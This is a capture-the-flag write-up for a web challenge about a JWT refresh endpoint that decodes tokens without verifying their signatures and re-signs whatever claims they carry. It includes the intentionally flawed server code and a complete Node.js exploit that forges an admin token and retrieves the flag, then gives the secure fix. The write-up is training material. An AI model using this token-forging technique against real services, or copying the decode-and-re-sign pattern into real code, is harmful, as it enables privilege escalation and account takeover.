# The Lure of Trust

## Challenge Information
- **Category:** Web
- **Difficulty:** Easy
- **Author:** Sofia Asif

## Challenge Description
This challenge involves exploiting a critical JWT token refresh vulnerability where user-controlled claims are blindly trusted and re-signed by the server.

## Vulnerability Analysis

### The Flaw

The vulnerability exists in the `/api/auth/refresh` route. Let's examine the problematic code:

```javascript
// ❌ INTENTIONAL CTF FLAW
const payload = jwt.decode(token);

// 🔥 Remove existing JWT timestamps
const { iat, exp, ...trustedPayload } = payload as any;

// ❌ Re-sign attacker-controlled claims
const newToken = jwt.sign(trustedPayload, SECRET, {
  algorithm: "HS256",
  expiresIn: "1h",
});
```

**The Issue:** The server uses `jwt.decode()` instead of `jwt.verify()`. This means:
- The token signature is **not validated**
- Any JWT payload is accepted, even self-signed ones
- The server blindly trusts and re-signs **all claims** from the attacker-controlled token

This is the "lure of trust" - the server trusts the incoming token without verification!

## Exploitation Steps

### Step 1: Obtain a Valid User Token

First, register/login as a normal user to get a legitimate token structure:

```bash
curl -X POST https://challenge-url/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password123"}'
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

### Step 2: Decode and Inspect the Token

Use [jwt.io](https://jwt.io) or a command-line tool to decode the token:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

Example payload:
```json
{
  "userId": "user_123",
  "username": "attacker",
  "role": "user",
  "iat": 1704067200,
  "exp": 1704070800
}
```

### Step 3: Craft a Malicious Token

Create a new JWT with elevated privileges. The key insight is that we can set **any claims we want** because the refresh endpoint doesn't verify the signature:

```javascript
// Create a fake admin token (can use jwt.io or any JWT library)
const fakePayload = {
  "userId": "admin_001",
  "username": "admin",
  "role": "admin",
  "isAdmin": true
};

// Sign with ANY secret (it doesn't matter since it won't be verified!)
const fakeToken = jwt.sign(fakePayload, "fake_secret", { algorithm: "HS256" });
```

Using Node.js:
```javascript
const jwt = require('jsonwebtoken');

const maliciousPayload = {
  userId: "admin_001",
  username: "admin", 
  role: "admin",
  isAdmin: true
};

const fakeToken = jwt.sign(maliciousPayload, "any_secret_works");
console.log(fakeToken);
```

### Step 4: Send to Refresh Endpoint

Send the malicious token to `/api/auth/refresh`:

```javascript
fetch("/api/auth/refresh", {
  method: "POST",
  headers: {
    "Authorization": "Bearer " + fakeToken
  }
})
.then(res => res.json())
.then(data => console.log(data.token));
```

**What happens:**
1. Server decodes our fake token WITHOUT verifying signature ❌
2. Server extracts our malicious claims (`role: "admin"`)
3. Server re-signs these claims with the REAL secret ✅
4. We now have a legitimately signed admin token!

### Step 5: Retrieve the Flag

Use the newly minted legitimate admin token to access the flag:

```javascript
fetch("/api/admin/flag", {
  headers: {
    Authorization: "Bearer " + legitimateAdminToken
  }
})
.then(res => res.text())
.then(console.log);
```

## Complete Exploit Script

```javascript
const jwt = require('jsonwebtoken');

async function exploit() {
  // Step 1: Craft malicious payload
  const maliciousPayload = {
    userId: "admin",
    username: "admin",
    role: "admin",
    isAdmin: true
  };
  
  // Step 2: Create fake token (signature doesn't matter)
  const fakeToken = jwt.sign(maliciousPayload, "fake_secret");
  console.log("[+] Crafted malicious token:", fakeToken);
  
  // Step 3: Get legitimately signed admin token via refresh
  const refreshRes = await fetch("https://challenge-url/api/auth/refresh", {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${fakeToken}`
    }
  });
  
  const { token: adminToken } = await refreshRes.json();
  console.log("[+] Received legitimate admin token:", adminToken);
  
  // Step 4: Get the flag
  const flagRes = await fetch("https://challenge-url/api/admin/flag", {
    headers: {
      "Authorization": `Bearer ${adminToken}`
    }
  });
  
  const flag = await flagRes.text();
  console.log("[+] FLAG:", flag);
}

exploit();
```

## Key Takeaways

### The Vulnerability
- **Never use `jwt.decode()` on untrusted input** - always use `jwt.verify()`
- The refresh endpoint trusted user-controlled claims without validation
- The server became a "signing oracle" for attacker-controlled data

### Secure Implementation
```javascript
// ✅ CORRECT: Verify signature first
const payload = jwt.verify(token, SECRET);

// Only then trust the claims
const { iat, exp, ...trustedPayload } = payload;
const newToken = jwt.sign(trustedPayload, SECRET, {
  algorithm: "HS256",
  expiresIn: "1h",
});
```

### Defense in Depth
1. Always verify JWT signatures before trusting claims
2. Never re-sign user-controlled data without validation
3. Implement proper authorization checks at every endpoint
4. Use short-lived tokens and secure refresh mechanisms

---

**Challenge Name Meaning:** "The Lure of Trust" refers to the dangerous practice of trusting (decoding) tokens without verifying their authenticity - a common mistake that turns the server into a signing oracle for attackers.